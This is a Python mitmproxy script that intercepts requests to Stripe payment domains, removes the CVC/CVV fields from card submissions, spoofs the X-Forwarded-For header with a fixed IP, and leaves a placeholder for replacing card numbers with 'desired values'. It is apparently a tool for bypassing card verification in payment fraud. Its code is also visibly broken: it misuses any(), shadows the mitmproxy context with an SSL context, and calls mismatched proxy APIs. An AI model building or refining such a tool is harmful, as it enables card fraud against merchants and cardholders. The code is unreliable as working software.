import os
import tempfile
import re
import threading
import ssl
from http.server import SimpleHTTPRequestHandler, HTTPServer
from mitmproxy import proxy, http, ctx

# Domains to intercept
STRIP_DOMAINS = ["api.stripe.com", "js.stripe.com", "m.stripe.com"]

# Static outbound IP address to use as proxy
outbound_ip = "13.228.225.19"

# Function to modify request body
def modify_request_body(request_body):
    # Remove CVV codes
    request_body = re.sub(r"payment_method_data\[card\]\[cvc\]=[^&]*&?", "", request_body)
    request_body = re.sub(r"card\[cvc\]=[^&]*&?", "", request_body)
    request_body = re.sub(r"source_data\[card\]\[cvc\]=[^&]*&?", "", request_body)

    # Replace credit card numbers with your desired values
    # ...

    return request_body

# Function to handle intercepted requests
def request(flow: http.HTTPFlow) -> None:
    # Check if request is related to Stripe domains
    if any(domain in flow.request.pretty_host for domain in STRIP_DOMAINS):
        # Modify request body if it contains credit card data
        if any("payment_method_data[card][number]" in flow.request.text or
               "card[number]" in flow.request.text or
               "source_data[card][number]" in flow.request.text):
            flow.request.text = modify_request_body(flow.request.text)
    
    # Modify request headers to specify the outbound IP address
    flow.request.headers["X-Forwarded-For"] = outbound_ip

# Function to serve CA certificate over HTTPS
def serve_certificate():
    # Set up SSL context
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.check_hostname = False
    ctx.load_cert_chain(certfile=os.path.join(tempfile.gettempdir(), "ca.pem"))

    # Start mitmproxy with SSL decryption
    config = proxy.config.ProxyConfig(
        ssl_ports=[443],
    )
    server = proxy.server.ProxyServer(config)

    # Run mitmproxy server
    m = proxy.master.Master(server)
    m.server = server

    # Print information message
    ctx.log.info("Serving CA certificate over HTTPS...")
    
    # Start mitmproxy
    m.run()

# Main entry point
def start():
    # Print information message
    ctx.log.info("Proxy server started with outbound IP address: %s", outbound_ip)
    ctx.log.info("Make sure your client is configured to use the proxy server.")

# Run proxy server in a separate thread
certificate_thread = threading.Thread(target=serve_certificate)
certificate_thread.start()

# Start the proxy server
start()
    
